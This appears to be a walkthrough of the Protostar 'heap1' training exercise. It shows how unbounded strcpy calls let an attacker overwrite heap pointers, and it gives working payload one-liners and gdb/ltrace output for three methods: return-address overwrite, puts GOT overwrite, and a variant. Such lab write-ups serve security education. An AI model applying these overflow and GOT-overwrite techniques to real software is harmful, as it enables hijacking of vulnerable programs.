@@ -1,0 +1,130 @@
+- the structures i1 and i2 are adjacent in the heap
+
+- the first unbound strcpy can overwrite i2->name with an address of our choice
+- the second one writes something at an address controlled by the previous strcpy
+	strcpy(i1->name, argv[1]);
+	strcpy(i2->name, argv[2]);
+
+Method 1
+=====================	
+- we'll overwrite the return address from second strcpy() function with winner() function
+
+- the address of winner function:
+$ objdump --syms heap1 | grep winner
+08048494 g     F .text	00000025              winner
+
+- use ltrace to get the addresses where structures are allocated:
+$ ltrace ./heap1 bbbb aaaa 
+__libc_start_main(0x80484b9, 3, 0xbffff894, 0x8048580, 0x8048570 <unfinished ...>
+malloc(8)                                                                        = 0x0804a008  # i1
+malloc(8)                                                                        = 0x0804a018  # allocated i1->name
+malloc(8)                                                                        = 0x0804a028  # i2
+malloc(8)                                                                        = 0x0804a038  # allocated i2->name
+strcpy(0x0804a018, "bbbb")                                                       = 0x0804a018  # 
+strcpy(0x0804a038, "aaaa")                                                       = 0x0804a038  # 
+puts("and that's a wrap folks!"and that's a wrap folks!
+)                                                 = 25
+
+0x0804a008 -- i1
+0x0804a008 -- i1->priority
+0x0804a00c -- i2-->name
+0x0804a018 allocated space for i1->name
+...
+
+i2->name is at 0x0804a02c, so to overwrite i1->name with the first strcpy(), 
+we need a padding of 20 bytes (0x0804a02c- 0x0804a018).
+
+
+(we could deduce this padding also by passing a pattern as the first argument, 
+and then see the address where the second strcpy() will fail to write.
+ ./pattern_create.rb 50
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+$ ./heap1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab AAAA
+Segmentation fault (core dumped)
+user@protostar:/opt/protostar/bin$ gdb -q heap1
+Reading symbols from /opt/protostar/bin/heap1...done.
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab AAAA
+Starting program: /opt/protostar/bin/heap1 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab AAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+*__GI_strcpy (dest=0x37614136 <Address 0x37614136 out of bounds>, src=0xbffff99e "AAAA") at strcpy.c:40
+40	strcpy.c: No such file or directory.
+	in strcpy.c
+(gdb) 
+
+# ./pattern_offset.rb 0x37614136
+20
+)
+
+- so the 2 parameters will be:
+argv[1]: |20 bytes filler | return from main address |
+argv[2]: |address of winner function() |
+
+- we test first in debug mode:
+(gdb) run $(perl -e 'print "A"x20 . "\x9c\xf7\xff\xbf" . " " . "\xEF\xBE\xAD\xDE"')
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /opt/protostar/bin/heap1 $(perl -e 'print "A"x20 . "\x9c\xf7\xff\xbf" . " " . "\xEF\xBE\xAD\xDE"')
+
+Breakpoint 1, main (argc=3, argv=0xbffff844) at heap1/heap1.c:23
+23	in heap1/heap1.c
+(gdb) i r esp ebp eip
+esp            0xbffff770	0xbffff770
+ebp            0xbffff798	0xbffff798
+eip            0x80484c2	0x80484c2 <main+9>
+(gdb) c
+Continuing.
+and that's a wrap folks!
+
+Program received signal SIGSEGV, Segmentation fault.
+0xdeadbeef in ?? ()
+(gdb) 
+
+- so 0xbffff79c is 4 bytes aftep ebp (correct. it's the return address)
+
+Withoud gdb this address will differ. After some trials, 0xbffff7ac seems to 
+be the correct return address to overwrite.
+Wrapping up:
+$ ./heap1 $(perl -e 'print "A"x20 . "\xac\xf7\xff\xbf" . " " . "\x94\x84\x04\x08"')
+and we have a winner @ 1349483069
+Segmentation fault (core dumped)
+
+(Obs! ony the printf() in winner() function is called, not the one in main())
+
+Method 2
+=======================
+Overwirte puts(), that is called from printf, with the address of winner() function
+
+user@protostar:/opt/protostar/bin$ objdump -R ./heap1 | grep puts
+08049774 R_386_JUMP_SLOT   puts
+
+$ ltrace ./heap1 `python -c 'print "A"*20 + "\x74\x97\x04\x08" + " \x94\x84\x04\x08"'`
+__libc_start_main(0x80484b9, 3, 0xbffff874, 0x8048580, 0x8048570 <unfinished ...>
+malloc(8)                                                                        = 0x0804a008
+malloc(8)                                                                        = 0x0804a018
+malloc(8)                                                                        = 0x0804a028
+malloc(8)                                                                        = 0x0804a038
+strcpy(0x0804a018, "AAAAAAAAAAAAAAAAAAAAt\227\004\b")                            = 0x0804a018
+strcpy(0x08049774, "\224\204\004\b")                                             = 0x08049774
+puts("and that's a wrap folks!" <unfinished ...>
+time(NULL)                                                                       = 1349477098
+printf("and we have a winner @ %d\n", 1349477098and we have a winner @ 1349477098
+)                                = 34
+<... puts resumed> )                                                             = 34
++++ exited (status 34) +++
+
+$ ./heap1 `python -c 'print "A"*20 + "\x74\x97\x04\x08" + " \x94\x84\x04\x08"'`
+and we have a winner @ 1349477093
+
+
+Method 3
+=======================================================================================
+$ ./heap1 $(perl -e 'print "A"x20 . "\xdc\xf7\xff\xbf" . " " . "\x94\x84\x04\x08"')
+and that's a wrap folks!
+and we have a winner @ 1349482996
+Segmentation fault (core dumped)
+
+
+Now both printf() are called: the one at the and of main and the one in
+winner() function
